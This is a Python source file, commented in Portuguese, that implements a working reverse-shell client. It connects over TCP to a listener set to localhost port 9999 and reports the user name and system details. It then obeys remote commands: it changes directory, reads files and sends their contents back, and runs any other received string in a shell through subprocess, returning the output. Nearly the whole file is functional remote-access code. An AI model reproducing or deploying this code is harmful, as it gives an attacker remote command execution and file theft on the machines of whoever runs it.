#-------------------------------------
#----Requer Python --version 3.7.0----
#-------------------------------------
#----Developer: Joeru AKA(Joerito)----
#-------------------------------------
import os #os import para subshell calls
import socket #Import para criar o socket para comunicação entre reverse e bind
import platform #Import para extrair alguma informação sobre a plataforma do bind
import subprocess #Import para criar subshell e executar comandos
from colorama import Fore, Back, Style, init #Import para adicionar cor ao texto do terminal
init() #init call para compatibilidade com windows

#Classe para o setup de cores
class Cor:

    #Método __init__() para inicializar algumas cores predefinidas
    def __init__(self):
        self.sucesso     = Style.BRIGHT + Back.GREEN + Fore.WHITE
        self.aviso       = Style.BRIGHT + Back.YELLOW + Fore.BLACK
        self.erro        = Style.BRIGHT + Back.RED + Fore.WHITE
        self.inputs      = Style.BRIGHT + Back.CYAN + Fore.WHITE
        self.pagina      = Style.BRIGHT + Back.WHITE + Fore.BLACK
        self.epty        = Style.BRIGHT + Back.WHITE + Fore.BLACK

        self.verde       = Style.BRIGHT + Fore.GREEN
        self.amarelo     = Style.BRIGHT + Fore.YELLOW
        self.vermelho    = Style.BRIGHT + Fore.RED
        self.magenta     = Style.BRIGHT + Fore.MAGENTA

        self.reset       = Style.RESET_ALL

    #Método Sucesso(self, texto), utilização Sucesso('texto'), para Mensagens de Sucesso
    def Sucesso(self, texto):
        return print(self.sucesso + texto + self.reset)

    #Método Aviso(self, texto), utilização Aviso('texto'), para Mensagens de Aviso
    def Aviso(self, texto):
        return print(self.aviso + texto + self.reset)

    #Método Erro(self, texto), utilização Erro('texto'), para Mensagens de Erro
    def Erro(self, texto):
        return print(self.erro + texto + self.reset)

    #Método Inputs(self, texto), utilização em input(Inputs('texto')), para Prompt de Input 
    def Inputs(self, texto):
        return print(self.inputs + texto + self.reset)

    #Método Mensagem(self, tipo, texto), utilização Mensagem(0,'texto')
    #----------------Exemplos----------------
    #   Mensagem(0,'texto') -> 0==sucesso
    #   Mensagem(1,'texto') -> 1==aviso
    #   Mensagem(2,'texto') -> 2==erro
    #   Mensagem(3,'texto') -> 3==inputs
    #----------------------------------------
    def Mensagem(self, tipo, texto):
        if tipo == 0:
            return print(self.sucesso + '[+]' + self.reset, texto)
        elif tipo == 1:
            return print(self.aviso + '[!]' + self.reset, texto)
        elif tipo == 2:
            return print(self.erro + '[ ): ]' + self.reset, texto)
        elif tipo == 3:
            return print(self.inputs + '[->]' + self.reset, texto)

#Classe para extrair intel, info sobre a plataforma do bind
class Plataforma:

    #Método __init__() para inicializar a extração de intel, info sobre a plataforma do bind
    def __init__(self):
        self.Utilizador     = str(os.getlogin())
        self.Nome_PC        = str(platform.node())
        self.Sistema        = str(platform.system())
        self.OS_Ver         = str(platform.release())
        self.OS_Full_Ver    = str(platform.platform())
        self.Arquitetura    = str(platform.architecture())
        self.Maquina        = str(platform.machine())
        self.CPU_           = str(os.cpu_count())
        self.CPU_Num        = str(os.cpu_count())

    #Método Mostrar_Info() return uma string com sobre a plataforma do bind, utilização Mostrar_Info()
    def Mostrar_Info(self):
        return "\nUtilizador: "+self.Utilizador+"\nNome do PC: "+self.Nome_PC+"\nSistema Operativo: "+self.Sistema+" "+self.OS_Ver+"\nOS Versao: "+self.OS_Full_Ver+"\nArquitetura: "+self.Arquitetura+"\nMaquina: "+self.Maquina+"\nProcessador: "+self.CPU_+" "+self.CPU_Num+" Cores"


#Classse SUBSHELL() prepara uma subshell
class SUBSHELL:

    #Método Executar(self, modo, comando), utilização Executar(0,'comando_para_ser_executado')
    def Executar(self, modo, comando):

        #sub_shell recebe um subprocess e conecta com as pipes de stdout, stderr e stdin
        sub_shell       = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        
        #raw_output recebe o valor do stdout or(ou) do stderr
        raw_output      = sub_shell.stdout.read() + sub_shell.stderr.read()
        #str_output converte o valor raw_output para str() string
        str_output      = str(raw_output,'latin-1')

        #-----------------------------------Exemplos de utilização do Método Executar()-----------------------------------
        #   Executar(0,'comando_para_ser_executado') -> 0==envia o output para o reverse
        #   Executar(1,'comando_para_ser_executado') -> 1==envia o output para o reverse e também printa o output no bind
        #-----------------------------------------------------------------------------------------------------------------

        if modo == 0:
            S.SOCKET.send(str.encode(str_output+'\n '))
        elif modo == 1:
            S.SOCKET.send(str.encode(str_output+'\n '))
            print(str_output)
        else:
            Texto.Mensagem(1,'MODO 0 OR 1')


#Classe para prepara a conexão entre o bind e o reverse
class Cliente_SOCKET:

    #                                              host pode ser o domain ou ipv4
    #Preparar o socket em modo AF_INET para tuplo (host,porta), SOCK_STREAM==TCP
    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #Método __init__() para inicializar valores predefinidos
    def __init__(self):
        self.InternetProtocol   = '127.0.0.1' #Neste caso LocalHost
        self.Porta              = 9999

    #Método Preparar_Conection() para tentar conectar a reverse. Except para timeout 
    def Preparar_Conection(self):
        try:
            self.SOCKET.connect((self.InternetProtocol, self.Porta))
        except ConnectionRefusedError:
            Texto.Mensagem(2,'Timeout')
        else:
            Texto.Mensagem(0,'Conetado (:')

    #Método Comandos() inicia algumas regras conforme os valores recebidos nos pacotes
    def Comandos(self):
        while True:

            pacotes_rcv=self.SOCKET.recv(1024).decode('utf-8')

            #se pacotes_rcv conter string 'sair' finaliza conexão
            if 'sair' in pacotes_rcv:
                Texto.Mensagem(1,'A Encerrar')
                self.SOCKET.close()
                break

            #se pacotes_rcv conter string 'limpar' executa em subshell cls e(and) clear
            elif 'limpar' in pacotes_rcv:
                os.system('cls')
                os.system('clear')

            #se pacotes_rcv conter string 'infocliente' executa Plat.Mostar_Info(), obs: Plat=Plataforma()
            elif 'infocliente' in pacotes_rcv:
                self.SOCKET.send(str.encode(Plat.Mostrar_Info()))

            #se pacotes_rcv conter string 'chdir', o nome do diretório fica para depois de 'chdir '
            elif 'chdir' in pacotes_rcv:
                diretorio=pacotes_rcv[6:]

                #tenta executar o chdir caso exista algum erro, excepts são criados e code call predefinidos são enviados para a reverse
                try:
                    os.chdir(diretorio)
                except FileExistsError:
                    self.SOCKET.send(str.encode('DIR_NA'))
                except NotADirectoryError:
                    self.SOCKET.send(str.encode('NOT_DIR'))
                except OSError:
                    self.SOCKET.send(str.encode('OS_ERR'))
                #senão o diretorio atual é enviado para a reverse
                else:
                    self.SOCKET.send(str.encode(os.getcwd()))

            #se pacotes_rcv conter string 'file', o nome do ficheiro fica para depois de 'file '
            elif 'file' in pacotes_rcv:
                ficheiro_nome=pacotes_rcv[5:]

                #tenta abrir o ficheiro em modo leitura, excepts são criados e code call predefinidos são enviados para a reverse
                try:
                    ficheiro=open(ficheiro_nome,'r')
                except FileNotFoundError:
                    self.SOCKET.send(str.encode('FILE_NF'))
                except PermissionError:
                    self.SOCKET.send(str.encode('NOT_FILE'))
                except IsADirectoryError:
                    self.SOCKET.send(str.encode('NOT_FILE'))
                #senão guarda os dados do ficheiro numa variável, fecha o ficheiro e finalmente envia os dados do ficheiro para a reverse
                else:
                    ficheiro_dados=ficheiro.read()
                    ficheiro.close()
                    S.SOCKET.send(str.encode(ficheiro_dados))

            #se comando não conter nenhuma string que entre no conjunto de regras predefinidas a string contida no comando é executada na subshell e o output do stdout ou(or) stderr é enviado para o reverse
            else:
                Shell.Executar(1,pacotes_rcv)


Texto=Cor() #Texto recebe classe Cor()
Plat=Plataforma() #Plat recebe classe Plataforma()
S=Cliente_SOCKET() #S recebe classe Cliente_SOCKET()
Shell=SUBSHELL() #Shell recebe classe SUBSHELL()

#Função main() é onde prepara a conexão com a reverse e depois são se tudo der certo xd exemplo: se não houver nenhum timeout, é inicializado os comandos
def main():
    S.Preparar_Conection()
    S.Comandos()

main()#O programa começa aqui

if __name__ == "__main__":
    main()
        